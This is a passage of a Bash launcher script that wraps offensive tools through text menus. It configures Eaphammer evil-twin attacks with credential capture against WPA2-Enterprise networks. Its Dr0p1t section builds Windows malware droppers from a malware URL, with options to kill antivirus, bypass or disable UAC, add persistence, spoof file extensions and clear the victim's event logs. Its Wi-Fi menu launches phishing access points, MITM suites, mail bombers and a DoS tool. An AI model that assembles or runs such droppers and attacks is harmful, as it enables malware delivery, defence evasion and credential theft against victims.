					elif [[ "$PAUTH" = 3 ]]
					then
						EAPHAUTH="peap"
					fi
				elif [[ "$EAPH" = 8 ]]
				then
					if [[ "$EAPHCREDS" = "OFF" ]]
					then
						EAPHCREDS="ON"
					else
						EAPHCREDS="OFF"
					fi
				elif [[ "$EAPH" = 9 ]]
				then
					if [[ "$EAPHHOSTILE" = "OFF" ]]
					then
						EAPHHOSTILE="ON"
					else
						EAPHHOSTILE="OFF"
					fi
				elif [[ "$EAPH" = 10 ]]
				then
					if [[ "$EAPHCAPTIVE" = "OFF" ]]
					then
						EAPHCAPTIVE="ON"
					else
						EAPHCAPTIVE="OFF"
					fi
				elif [[ "$EAPH" = 11 ]]
				then
					if [[ "$EAPHPIVOT" = "OFF" ]]
					then
						EAPHPIVOT="ON"
					else
						EAPHPIVOT="OFF"
					fi
				elif [[ "$EAPH" = 12 ]]
				then
					if [[ "$EAPHKARMA" = "OFF" ]]
					then
						EAPHKARMA="ON"
					else
						EAPHKARMA="OFF"
					fi
				elif [[ "$EAPH" = 13 ]]
				then
					if [[ "$EAPHAIRCRACK" = "OFF" ]]
					then
						clear
						echo -e "Hostname: "
						read HOSTN
						echo -e "Port: "
						read PORT
						clear
						EAPHAIRCRACK=""$HOSTN":"$PORT""
					else
						EAPHAIRCRACK="OFF"
					fi
				elif [[ "$EAPH" = 14 ]]
				then
					if [[ "$EAPHINTAUTO" = "OFF" ]]
					then
						EAPHINTAUTO="ON"
					else
						EAPHINTAUTO="OFF"
					fi
				elif [[ "$EAPH" = 15 ]]
				then
					if [[ "$EAPHWORD" != "OFF" && "$EAPHWORD" != "\e[1;31mNONE\e[0m" ]]
					then
						EAPHWORD="OFF"
					else
						clear
						echo -e "Type the full wordlist path: "
						read EAPHWORD
					fi
				elif [[ "$EAPH" = "back" || "$EAPH" = "b" ]]
				then
					clear
					break
				elif [[ "$EAPH" = "00" ]]
				then
					clear
					exec bash $0
				elif [[ "$EAPH" = "0" ]]
				then
					clear
					exit
				elif [[ "$EAPH" = "start" ]]
				then
					clear
					if [[ "$OK1" != 1 ]]
					then
						echo -e "Você não especificou os requisitos importantes"
						sleep 4
						continue
					fi
					if [[ "$OK2" != 1 ]]
					then
						echo -e "Você não especificou uma lista de palavras para o autocrack"
						sleep 4
						continue
					fi
				if [[ "$EAPHCREDS" = "ON" ]]
				then
					CREDS="--creds"
				else
					CREDS=""
				fi
				if [[ "$EAPHHOSTILE" = "ON" ]]
				then
					HOSTILE="--hostile-portal"
				else
					HOSTILE=""
				fi
				if [[ "$EAPHCAPTIVE" = "ON" ]]
				then
					CAPTIVE="--captive-portal"
				else
					CAPTIVE=""
				fi
				if [[ "$EAPHPIVOT" = "ON" ]]
				then
					PIVOT="--pivot"
				else
					PIVOT=""
				fi
				if [[ "$EAPHKARMA" = "ON" ]]
				then
					KARMA="--karma"
				else
					KARMA=""
				fi
				if [[ "$EAPHINTAUTO" = "ON" ]]
				then
					INTAUTO="--local-autocrack"
				else
					INTAUTO=""
				fi
				if [[ "$EAPHAIRCRACK" != "OFF" ]]
				then
					AIRCRACK="--remote-autocrack $EAPHAIRCRACK"
				else
					AIRCRACK=""
				fi
				if [[ "$EAPHAIRCRACK" != "OFF" || "$EAPHINTAUTO" != "OFF" ]]
				then
					WORD="--wordlist $EAPHWORD"
				else
					WORD=""
				fi
				IFACE="-i $EAPHIFACE"
				CHANNEL="-c $EAPHCHANNEL"
				ESSID="-e $EAPHESSID"
				BSSID="-b $EAPHBSSID"
				WPA="--wpa $EAPHWPA"
				AUTH="--auth $EAPHAUTH"
					cd /root/eaphammer
					./eaphammer $IFACE $CHANNEL $BSSID $ESSID $WPA $AUTH $PIVOT $KARMA $INTAUTO $CAPTIVE $HOSTILE $CREDS $AIRCRACK $WORD
					
				fi
			done
}
function dropit_automation
{
clear
while true
do
	clear
	TERMINALTITLE="Dr0p1t-Framework"
	dash_calc
	printf '\033]2;Dr0p1t-Framework\a'
	if [[ "$MALURL" = "" ]]
	then
		MALURL="\e[1;31mNONE\e[0m"
	fi
	if [[ "$STARTUP" = "" ]]
	then
		STARTUP="OFF"
	fi
	if [[ "$TASK" = "" ]]
	then
		TASK="OFF"
	fi
	if [[ "$LTPUP" = "" ]]
	then
		LTPUP="OFF"
	fi
	if [[ "$KILLANT" = "" ]]
	then
		KILLANT="OFF"
	fi
	if [[ "$RUNBAT" = "" ]]
	then
		RUNBAT="OFF"
	fi
	if [[ "$RUNPOW" = "" ]]
	then
		RUNPOW="OFF"
	fi
	if [[ "$RUNVBS" = "" ]]
	then
		RUNVBS="OFF"
	fi
	if [[ "$UACASADMIN" = "" ]]
	then
		UACASADMIN="OFF"
	fi
	if [[ "$SPOOFEXT" = "" ]]
	then
		SPOOFEXT="OFF"
	fi
	if [[ "$ISZIP" = "" ]]
	then
		ISZIP="OFF"
	fi
	if [[ "$COMPRESS" = "" ]]
	then
		COMPRESS="OFF"
	fi
	if [[ "$DISUAC" = "" ]]
	then
		DISUAC="OFF"
	fi
	if [[ "$ICON" = "" ]]
	then
		ICON="OFF"
	fi
	if [[ "$EVENT" = "" ]]
	then
		EVENT="OFF"
	fi
	if [[ "$COMPILE" = "" ]]
	then
		COMPILE="OFF"
	fi
	if [[ "$D32" = "" ]]
	then
		D32="OFF"
	fi
	if [[ "$D64" = "" ]]
	then
		D64="OFF"
	fi
	if [[ "$BANN" = "" ]]
	then
		BANN="OFF"
	fi
	echo -e ""$YS" 1"$CE") URL de malware                          CURRENT:$MALURL"
	echo -e ""$YS" 2"$CE") Malware para iniciar                   CURRENT:$STARTUP"
	echo -e ""$YS" 3"$CE") Malware para agendador de tarefas            CURRENT:$TASK"
	echo -e ""$YS" 4"$CE") Adicionar link ao perfil do usuário do powershell  CURRENT:$LTPUP"
	echo -e ""$YS" 5"$CE") Mate o antivírus antes do malware        CURRENT:$KILLANT"
	echo -e ""$YS" 6"$CE") Execute o script em lote antes do malware      CURRENT:$RUNBAT"
	echo -e ""$YS" 7"$CE") Execute o script do powershell antes do malware CURRENT:$RUNPOW"
	echo -e ""$YS" 8"$CE") Execute o script vbs antes do malware      CURRENT:$RUNVBS"
	echo -e ""$YS" 9"$CE") Bypass UAC e execute malware como administrador  CURRENT:$UACASADMIN"
	echo -e ""$YS"10"$CE") Spoof arquivo final para uma extensão    CURRENT:$SPOOFEXT"
	echo -e ""$YS"11"$CE") Malware é zip comprimido           CURRENT:$ISZIP"
	echo -e ""$YS"12"$CE") Comprima o arquivo final com UPX     CURRENT:$COMPRESS"
	echo -e ""$YS"13"$CE") Tente desativar o UAC no dispositivo da vítima CURRENT:$DISUAC"
	echo -e ""$YS"14"$CE") Use o ícone para o arquivo final           CURRENT:$ICON"
	echo -e ""$YS"15"$CE") Não limpe o registro de eventos do alvo      CURRENT:$EVENT"
	echo -e ""$YS"16"$CE") Não compile o arquivo final         CURRENT:$COMPILE"
	echo -e ""$YS"17"$CE") Baixe malware apenas para 32 bits    CURRENT:$D32"
	echo -e ""$YS"18"$CE") Baixe malware apenas para 64 bits     CURRENT:$D64"
	echo -e ""$YS"19"$CE") Fique bem (sem bandeira)               CURRENT:$BANN"
	echo -e ""$YS" o"$CE") Abrir pasta de saída"
	echo -e ""$YS" u"$CE") Verifique atualizações"
	echo -e ""$YS" b"$CE") Voltar"
	echo -e ""$YS"start"$CE") Gerar"
	echo -e "Escolha: "
	read DR
	clear
	if [[ "$DR" = "o" ]]
	then
		xdg-open /root/Dr0p1t-Framework/output
		continue
	fi
	if [[ "$DR" = "u" ]]
	then
		cd /root/Dr0p1t-Framework
		python Dr0p1t.py -u
		cd
		continue
	fi
	if [[ "$DR" = "start" ]]
	then
		if [[ "$MALURL" = "\e[1;31mNONE\e[0m" ]]
		then
			echo -e ""$RS"No URL specified."$CE""
			sleep 2
			continue
		fi
		if [[ "$STARTUP" = "OFF" ]]
		then
			DSTARTUP=""
		else
			DSTARTUP="-s"
		fi
		if [[ "$TASK" = "OFF" ]]
		then
			DTASK=""
		else
			DTASK="-t"
		fi
		if [[ "$LTPUP" = "OFF" ]]
		then
			DLTPUP=""
		else
			DLTPUP="-a"
		fi
		if [[ "$KILLANT" = "OFF" ]]
		then
			DKILLANT=""
		else
			DKILLANT="-k"
		fi
		if [[ "$RUNBAT" = "OFF" ]]
		then
			DRUNBAT=""
		else
			DRUNBAT="-b $RUNBAT"
		fi
		if [[ "$RUNPOW" = "OFF" ]]
		then
			DRUNPOW=""
		else
			DRUNPOW="-p $RUNPOW"
		fi
		if [[ "$RUNVBS" = "OFF" ]]
		then
			DRUNVBS=""
		else
			DRUNVBS="-v $RUNVBS"
		fi
		if [[ "$UACASADMIN" = "OFF" ]]
		then
			DUACASADMIN=""
		else
			DUACASADMIN="--runas"
		fi
		if [[ "$SPOOFEXT" = "OFF" ]]
		then
			DSPOOFEXT=""
		else
			DSPOOFEXT="--spoof $SPOOFEXT"
		fi
		if [[ "$ISZIP" = "OFF" ]]
		then
			DISZIP=""
		else
			DISZIP="--zip"
		fi
		if [[ "$COMPRESS" = "OFF" ]]
		then
			DCOMPRESS=""
		else
			DCOMPRESS="--upx"
		fi
		if [[ "$DISUAC" = "OFF" ]]
		then
			DDISUAC=""
		else
			DDISIAC="--nouac"
		fi
		if [[ "$ICON" = "OFF" ]]
		then
			DICON=""
		else
			DICON="-i $ICON"
		fi
		if [[ "$EVENT" = "OFF" ]]
		then
			DEVENT=""
		else
			DEVENT="--noclearevent"
		fi
		if [[ "$COMPILE" = "OFF" ]]
		then
			DCOMPILE=""
		else
			DCOMPILE="--nocompile"
		fi
		if [[ "$D32" = "OFF" ]]
		then
			DD32=""
		else
			DD32="--only32"
		fi
		if [[ "$D64" = "OFF" ]]
		then
			DD64=""
		else
			DD64="--only64"
		fi
		if [[ "$BANN" = "OFF" ]]
		then
			DBANN=""
		else
			DBANN="-q"
		fi
		cd /root/Dr0p1t-Framework
		python Dr0p1t.py $MALURL $DSTARTUP $DTASK $DLTPUP $DKILLANT $DRUNBAT $DRUNPOW $DRUNVBS $DUACASADMIN $DSPOOFEXT $DISZIP $DCOMPRESS $DDISUAC $DICON $DEVENT $DCOMPILE $DD32 $DD64 $DBANN
		echo -e "$PAKTGB"
		$READAK
		cd
	elif [[ "$DR" = 1 ]]
	then
		echo -e "Malware URL: "
		read MALURL
	elif [[ "$DR" = 14 ]]
	then
		if [[ "$ICON" = "OFF" ]]
		then
			while true
			do
				echo -e ""$RS"Icon must be on /root/Dr0p1t-Framework/icons folder."$CE""
				echo -e ""
				ls -1 /root/Dr0p1t-Framework/icons/
				echo -e ""
				echo -e ""$YS"cp"$CE") Copy my icon to that folder"
				echo -e ""$YS" b"$CE") Go back"
				echo -e "Enter the name of your icon: "
				read ICON
				if [[ "$ICON" = "b" ]]
				then
					ICON="OFF"
					break
				elif [[ "$ICON" = "m" ]]
				then
					clear
					echo -e "Your file path: "
					read FP
					if [[ ! -f "$FP" ]]
					then
						echo -e ""$RS"File does not exist."$CE""
						sleep 2
					else
						cp "$FP" /root/Dr0p1t-Framework/icons/
					fi
				elif [[ ! -f /root/Dr0p1t-Framework/icons/"$ICON" ]]
				then
					if [[ ! -f /root/Dr0p1t-Framework/icons/"$ICON".ico ]]
					then
						echo -e ""$RS"File not found."$CE""
						sleep 2
					else
						ICON=""$ICON".ico"
						break
					fi
				else
					break
				fi
			done
		else
			ICON="OFF"
		fi
	elif [[ "$DR" = 8 ]]
	then
		if [[ "$RUNVBS" = "OFF" ]]
		then
			while true
			do
				echo -e ""$RS"Script must be on /root/Dr0p1t-Framework/scripts/vbs folder."$CE""
				echo -e ""
				ls -1 /root/Dr0p1t-Framework/scripts/vbs/
				echo -e ""
				echo -e ""$YS"cp"$CE") Copy my script to that folder"
				echo -e ""$YS" b"$CE") Go back"
				echo -e "Enter the name of your script: "
				read RUNVBS
				if [[ "$RUNVBS" = "b" ]]
				then
					RUNVBS="OFF"
					break
				elif [[ "$RUNVBS" = "m" ]]
				then
					clear
					echo -e "Your file path: "
					read FP
					if [[ ! -f "$FP" ]]
					then
						echo -e ""$RS"File does not exist."$CE""
						sleep 2
					else
						cp "$FP" /root/Dr0p1t-Framework/scripts/vbs/
					fi
				elif [[ ! -f /root/Dr0p1t-Framework/scripts/vbs/"$RUNVBS" ]]
				then
					if [[ ! -f /root/Dr0p1t-Framework/scripts/vbs/"$RUNVBS".vbs ]]
					then
						echo -e ""$RS"File not found."$CE""
						sleep 2
					else
						RUNVBS=""$RUNVBS".vbs"
						break
					fi
				else
					break
				fi
			done
		else
			RUNVBS="OFF"
		fi
	elif [[ "$DR" = 7 ]]
	then
		if [[ "$RUNPOW" = "OFF" ]]
		then
			while true
			do
				echo -e ""$RS"Script must be on /root/Dr0p1t-Framework/scripts/powershell folder."$CE""
				echo -e ""
				ls -1 /root/Dr0p1t-Framework/scripts/powershell/
				echo -e ""
				echo -e ""$YS"cp"$CE") Copy my script to that folder"
				echo -e ""$YS" b"$CE") Go back"
				echo -e "Enter the name of your script: "
				read RUNPOW
				if [[ "$RUNPOW" = "b" ]]
				then
					RUNPOW="OFF"
					break
				elif [[ "$RUNPOW" = "m" ]]
				then
					clear
					echo -e "Your file path: "
					read FP
					if [[ ! -f "$FP" ]]
					then
						echo -e ""$RS"File does not exist."$CE""
						sleep 2
					else
						cp "$FP" /root/Dr0p1t-Framework/scripts/powershell/
					fi
				elif [[ ! -f /root/Dr0p1t-Framework/scripts/powershell/"$RUNPOW" ]]
				then
					if [[ ! -f /root/Dr0p1t-Framework/scripts/powershell/"$RUNPOW".ps1 ]]
					then
						echo -e ""$RS"File not found."$CE""
						sleep 2
					else
						RUNPOW=""$RUNPOW".ps1"
						break
					fi
				else
					break
				fi
			done
		else
			RUNPOW="OFF"
		fi
	elif [[ "$DR" = 6 ]]
	then
		if [[ "$RUNBAT" = "OFF" ]]
		then
			while true
			do
				echo -e ""$RS"Script must be on /root/Dr0p1t-Framework/scripts/bat folder."$CE""
				echo -e ""
				ls -1 /root/Dr0p1t-Framework/scripts/bat/
				echo -e ""
				echo -e ""$YS"cp"$CE") Copy my script to that folder"
				echo -e ""$YS" b"$CE") Go back"
				echo -e "Enter the name of your script: "
				read RUNBAT
				if [[ "$RUNBAT" = "b" ]]
				then
					RUNBAT="OFF"
					break
				elif [[ "$RUNBAT" = "m" ]]
				then
					clear
					echo -e "Your file path: "
					read FP
					if [[ ! -f "$FP" ]]
					then
						echo -e ""$RS"File does not exist."$CE""
						sleep 2
					else
						cp "$FP" /root/Dr0p1t-Framework/scripts/bat/
					fi
				elif [[ ! -f /root/Dr0p1t-Framework/scripts/bat/"$RUNBAT" ]]
				then
					if [[ ! -f /root/Dr0p1t-Framework/scripts/bat/"$RUNBAT".bat ]]
					then
						echo -e ""$RS"File not found."$CE""
						sleep 2
					else
						RUNBAT=""$RUNBAT".bat"
						break
					fi
				else
					break
				fi
			done
		else
			RUNBAT="OFF"
		fi
	elif [[ "$DR" = 2 ]]
	then
		if [[ "$STARTUP" = "OFF" ]]
		then
			STARTUP="ON"
		else
			STARTUP="OFF"
		fi
	elif [[ "$DR" = 3 ]]
	then
		if [[ "$TASK" = "OFF" ]]
		then
			TASK="ON"
		else
			TASK="OFF"
		fi
	elif [[ "$DR" = 4 ]]
	then
		if [[ "$LTPUP" = "OFF" ]]
		then
			LTPUP="ON"
		else
			LTPUP="OFF"
		fi
	elif [[ "$DR" = 5 ]]
	then
		if [[ "$KILLANT" = "OFF" ]]
		then
			KILLANT="ON"
		else
			KILLANT="OFF"
		fi
	elif [[ "$DR" = 9 ]]
	then
		if [[ "$UACASADMIN" = "OFF" ]]
		then
			UACASADMIN="ON"
		else
			UACASADMIN="OFF"
		fi
	elif [[ "$DR" = 10 ]]
	then
		if [[ "$SPOOFEXT" = "OFF" ]]
		then
			echo -e "Extension: "
			read SPOOFEXT
		else
			SPOOFEXT="OFF"
		fi
	elif [[ "$DR" = 11 ]]
	then
		if [[ "$ISZIP" = "OFF" ]]
		then
			ISZIP="ON"
		else
			ISZIP="OFF"
		fi
	elif [[ "$DR" = 12 ]]
	then
		if [[ "$COMPRESS" = "OFF" ]]
		then
			COMPRESS="ON"
		else
			COMPRESS="OFF"
		fi
	elif [[ "$DR" = 13 ]]
	then
		if [[ "$DISUAC" = "OFF" ]]
		then
			DISUAC="ON"
		else
			DISUAC="OFF"
		fi
	elif [[ "$DR" = 15 ]]
	then
		if [[ "$EVENT" = "OFF" ]]
		then
			EVENT="ON"
		else
			EVENT="OFF"
		fi
	elif [[ "$DR" = 16 ]]
	then
		if [[ "$COMPILE" = "OFF" ]]
		then
			COMPILE="ON"
		else
			COMPILE="OFF"
		fi
	elif [[ "$DR" = 17 ]]
	then
		if [[ "$D32" = "OFF" ]]
		then
			D32="ON"
		else
			D32="OFF"
		fi
	elif [[ "$DR" = 18 ]]
	then
		if [[ "$D64" = "OFF" ]]
		then
			D64="ON"
		else
			D64="OFF"
		fi
	elif [[ "$DR" = 19 ]]
	then
		if [[ "$BANN" = "OFF" ]]
		then
			BANN="ON"
		else
			BANN="OFF"
		fi
	fi
done
}
function wifi_tools
{
	while true
	do
	printf '\033]2;WIFI TOOLS\a'
	clear
	TERMINALTITLE="WIFI TOOLS"
	dash_calc
	if [[ -d /root/fluxion ]]
	then
		echo -e ""$YS" 1"$CE") Fluxion            Multitool-Fake AP with pass confirmation"
	else
		echo -e ""$RS" 1"$CE") "$RS"Fluxion"$CE"            Multitool-Fake AP with pass confirmation"
	fi
	if [[ -f /usr/bin/wifite ]]
	then
		echo -e ""$YS" 2"$CE") Wifite             Multitool"
	else
		echo -e ""$RS" 2"$CE") "$RS"Wifite"$CE"             Multitool"
	fi
	if [[ -d /root/wifiphisher ]]
	then
		echo -e ""$YS" 3"$CE") Wifiphisher        Multitool-Fake AP etc.."
	else
		echo -e ""$RS" 3"$CE") "$RS"Wifiphisher"$CE"        Multitool-Fake AP etc.."
	fi
	if [[ -d /root/Zatacker ]]
	then
		echo -e ""$YS" 4"$CE") Zatacker           MITM-NMAP-Mail Spammer..(Install it manually)"
	else
		echo -e ""$RS" 4"$CE") "$RS"Zatacker"$CE"           MITM-NMAP-Mail Spammer..(Install it manually)"
	fi
	if [[ -d /root/morpheus ]]
	then
		echo -e ""$YS" 5"$CE") Morpheus           ------------ULTIMATE MITM SUIT------------"
	else
		echo -e ""$RS" 5"$CE") "$RS"Morpheus"$CE"           ------------ULTIMATE MITM SUIT------------"
	fi
	if [[ -d /root/osrframework ]]
	then
		echo -e ""$YS" 6"$CE") Osrfconsole        Checks usernames-phones to platforms etc.."
	else
		echo -e ""$RS" 6"$CE") "$RS"Osrfconsole"$CE"        Checks usernames-phones to platforms etc.."
	fi
	if [[ -d /root/hakkuframework ]]
	then
		echo -e ""$YS" 7"$CE") Hakku              Multitool-mail bomb-sniffs-cracks etc.."
	else
		echo -e ""$RS" 7"$CE") "$RS"Hakku"$CE"              Multitool-mail bomb-sniffs-cracks etc.."
	fi
	if [[ -d /root/Trity ]]
	then
		echo -e ""$YS" 8"$CE") Trity              Multitool-locate ip-email bombs-brutforse etc.."
	else
		echo -e ""$RS" 8"$CE") "$RS"Trity"$CE"              Multitool-locate ip-email bombs-brutforse etc.."
	fi
	if [[ -d /root/Dracnmap ]]
	then				
		echo -e ""$YS" 9"$CE") Dracnmap           Many scan options"
	else
		echo -e ""$RS" 9"$CE") "$RS"Dracnmap"$CE"           Many scan options"
	fi
	if [[ -d "/usr/share/fern-wifi-cracker" ]]
	then	
		echo -e ""$YS"10"$CE") Fern               Wifi cracker GUI"
	else
		echo -e ""$RS"10"$CE") "$RS"Fern"$CE"               Wifi cracker GUI"
	fi
	if [[ -f /usr/sbin/netdiscover ]]
	then	
		echo -e ""$YS"11"$CE") Netdiscover        IPs and MACs on your net"
	else
		echo -e ""$RS"11"$CE") "$RS"Netdiscover"$CE"        IPs and MACs on your net"
	fi
	if [[ -d /root/kickthemout ]]
	then	
		echo -e ""$YS"12"$CE") KickThemOut        Kick clients out of your network"
	else
		echo -e ""$RS"12"$CE") "$RS"KickThemOut"$CE"        Kick clients out of your network"
	fi
	if [[ -d "/usr/share/ghost-phisher" ]]
	then	
		echo -e ""$YS"13"$CE") Ghost-Phisher      Fake AP,MITM,Session hijacking etc..."
	else
		echo -e ""$RS"13"$CE") "$RS"Ghost-Phisher"$CE"      Fake AP,MITM,Session hijacking etc..."
	fi
	if [[ -d /root/The-Eye ]]
	then	
		echo -e ""$YS"14"$CE") The Eye            Detects ARP poisoning DNS spoofing etc..."
	else
		echo -e ""$RS"14"$CE") "$RS"The Eye"$CE"            Detects ARP poisoning DNS spoofing etc..."
	fi
	if [[ -d /root/xerxes ]]
	then	
		echo -e ""$YS"15"$CE") Xerxes             The most powerful DoS tool(CAUTION)"
	else
		echo -e ""$RS"15"$CE") "$RS"Xerxes"$CE"             The most powerful DoS tool(CAUTION)"
	fi
	#~ echo -e ""$YS"16"$CE") ShARP(problematic) Detects who is spoofing on your network"
	if [[ -d /root/mdk3-master ]]
	then
		echo -e ""$YS"16"$CE") Mdk3-master        Tries to lock / reboot AP and more..."
	else
		echo -e ""$RS"16"$CE") "$RS"Mdk3-master"$CE"        Tries to lock / reboot AP and more..."
	fi
	if [[ -d /root/mdk3-master ]]
	then
		echo -e ""$YS"17"$CE") Mdk3-master        Tries to reboot the AP and unlock the WPS lock"
	else
		echo -e ""$RS"17"$CE") "$RS"Mdk3-master"$CE"        Tries to reboot the AP and unlock the WPS lock"
	fi
	if [[ -d /root/KatanaFramework ]]
	then
		echo -e ""$YS"18"$CE") Katana Framework   Many penetration testing features"
	else
		echo -e ""$RS"18"$CE") "$RS"Katana Framework"$CE"   Many penetration testing features"
	fi
	if [[ -d /root/airgeddon ]]
	then
		echo -e ""$YS"19"$CE") Airgeddon          Evil twin-WPA WPA2-WEP-WPS and more"
	else
		echo -e ""$RS"19"$CE") "$RS"Airgeddon"$CE"          Evil twin-WPA WPA2-WEP-WPS and more"
	fi
	if [[ -f /usr/bin/websploit ]]
	then
		echo -e ""$YS"20"$CE") Websploit          Wireless attack-multitool"
	else
		echo -e ""$RS"20"$CE") "$RS"Websploit"$CE"          Wireless attack-multitool"
	fi
	if [[ -d /etc/openvas ]]
	then
		echo -e ""$YS"21"$CE") Openvas            Vulnerability scanner LAN"
	else
		echo -e ""$RS"21"$CE") "$RS"Openvas"$CE"            Vulnerability scanner LAN"
	fi
	if [[ -f /usr/bin/ipscan ]]
	then
		echo -e ""$YS"22"$CE") Angry IP Scanner   IP Scanner"
	else
		echo -e ""$RS"22"$CE") "$RS"Angry IP Scanner"$CE"   IP Scanner"
	fi
	if [[ -d /root/routersploit ]]
	then
		echo -e ""$YS"23"$CE") Routersploit       Find/exploit router vulnerabilities"
	else
		echo -e ""$RS"23"$CE") "$RS"Routersploit"$CE"       Find/exploit router vulnerabilities"
	fi
	if [[ -d /root/nWatch ]]
	then
		echo -e ""$YS"24"$CE") nWatch             IP scanner/OS detection"
	else
		echo -e ""$RS"24"$CE") "$RS"nWatch"$CE"             IP scanner/OS detection"
	fi
	if [[ -d /root/eternal_scanner ]]
	then
		echo -e ""$YS"25"$CE") Eternal scanner    Scans hosts for eternalblue vulnerabilities"
	else
		echo -e ""$RS"25"$CE") "$RS"Eternal scanner"$CE"    Scans hosts for eternalblue vulnerabilities"
	fi
	if [[ -d /root/eaphammer ]]
	then
		echo -e ""$YS"26"$CE") Eaphammer          Evil twin attacks against WPA2-Enterprise networks"
	else
		echo -e ""$RS"26"$CE") "$RS"Eaphammer"$CE"          Evil twin attacks against WPA2-Enterprise networks"
	fi
	if [[ -d /root/VMR ]]
	then
		echo -e ""$YS"27"$CE") VMR                Best WPS cracker, mdk3-v6"
	else
		echo -e ""$RS"27"$CE") "$RS"VMR"$CE"                Best WPS cracker, mdk3-v6"
	fi
	if [[ -d /root/netattack2 ]]
	then
		echo -e ""$YS"28"$CE") Netattack3         Advanced network scan and attack script"
	else
		echo -e ""$RS"28"$CE") "$RS"Netattack2"$CE"         Advanced network scan and attack script"
	fi
	if [[ -f /usr/bin/wifi-pumpkin ]]
	then
		echo -e ""$YS"29"$CE") Wifi-Pumpkin       Framework for Rogue Wi-Fi Access Point Attack"
	else
		echo -e ""$RS"29"$CE") "$RS"Wifi-Pumpkin"$CE"       Framework for Rogue Wi-Fi Access Point Attack"
	fi
	if [[ -d /root/Gloom-Framework ]]
	then
		echo -e ""$YS"30"$CE") Gloom              Penetration Testing Framework"
	else
		echo -e ""$RS"30"$CE") "$RS"Gloom"$CE"              Penetration Testing Framework"
	fi
	if [[ -f /usr/bin/sechub ]]
	then
		echo -e ""$YS"31"$CE") secHub             Security/Hacking Kit"
	else
		echo -e ""$RS"31"$CE") "$RS"secHub"$CE"             Security/Hacking Kit"
	fi
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS"00"$CE") Main menu"
	#echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e APPP
	clear
	if [[ "$APPP" = "1" ]]
	then
		if [[ -d /root/fluxion ]]
		then
			cd /root/fluxion
			./fluxion
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_fluxion
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "2" ]]
	then
		if [[ -f /usr/bin/wifite ]]
		then
			wifite
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifite
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "3" ]]
	then
		if [[ -d /root/wifiphisher ]]
		then
			echo -e "Do you have 1 or 2 wireless interfaces?: "
			read ONEORTWO
			if [[ "$ONEORTWO" = "1" ]]
			then
				clear
				echo -e "Note that with only 1 wireless interface, wifiphisher doesn't deauthenticate the AP."
				sleep 1
				echo -e ""
				echo -e "$PAKTC"
				$READAK
				clear
				wifiphisher -nJ
			else
				clear
				wifiphisher
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifiphisher
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "4" ]]
	then
		if [[ -d /root/Zatacker ]]
		then
			if [[ -d "/root/Zatacker" ]]
			then	
				cd /root/Zatacker
				./ZT.sh
				cd
			else
				echo -e "You have to install it manually since its not on github.Sorry."
				sleep 4
				exec bash "$0"
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_zatacker
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "5" ]]
	then
		if [[ -d /root/morpheus ]]
		then
			cd /root/morpheus
			./morpheus.sh
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_morpheus
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "7" ]]
	then
		if [[ -d /root/hakkuframework ]]
		then
			echo -e "type: 'show modules' to start"
			sleep 2
			clear
			cd /root/hakkuframework
			./hakku
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_hakku
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "8" ]]
	then
		if [[ -d /root/Trity ]]
		then
			echo -e "type: 'help' to start"
			sleep 2
			clear
			trity			
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_trity
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "9" ]]
	then
		if [[ -d "/root/Dracnmap" ]]
		then
			cd /root/Dracnmap/
			./dracnmap-v*.sh	
			cd		
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_dracnmap
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "10" ]]
	then
		if [[ -d "/usr/share/fern-wifi-cracker" ]]
		then
			cd /root/Fern-Wifi-Cracker
			python execute.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_fern
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "11" ]]
	then
		if [[ -f /usr/sbin/netdiscover ]]
		then
			echo -e "Range ("$YS"Enter"$CE"=192.168.1.0/24):"
			read NRANGE
			if [[ -z $NRANGE ]]
			then
				NRANGE="192.168.1.0/24"
			fi
			netdiscover -r $NRANGE -i "$WLANN"
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_netdiscover
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "12" ]]
	then
		if [[ -d "/root/kickthemout" ]]
		then
			cd /root/kickthemout
			python kickthemout.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_kickthemout
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "13" ]]
	then
		if [[ -d "/usr/share/ghost-phisher" ]]
		then	
			cd /root/ghost-phisher/Ghost-Phisher
			python ghost.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_ghostphisher
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "14" ]]
	then
		if [[ -d "/root/The-Eye" ]]
		then
			cd /root/The-Eye
			./TheEye
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_theeye
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "15" ]]
	then
		if [[ -d "/root/xerxes" ]]
		then
			echo -e "Do you own the site you want to DoS?"$YNONLY""
			read DOSTERM
			if [[ "$DOSTERM" = "y" ]]
			then

				clear
				echo -e "Enter your site(e.g: iownthissite.com): "
				echo -e "(without www)"
				read -e SITEDOS
				clear
				echo -e "Launching www.isitdownrightnow.com for $SITEDOS"
				sleep 4
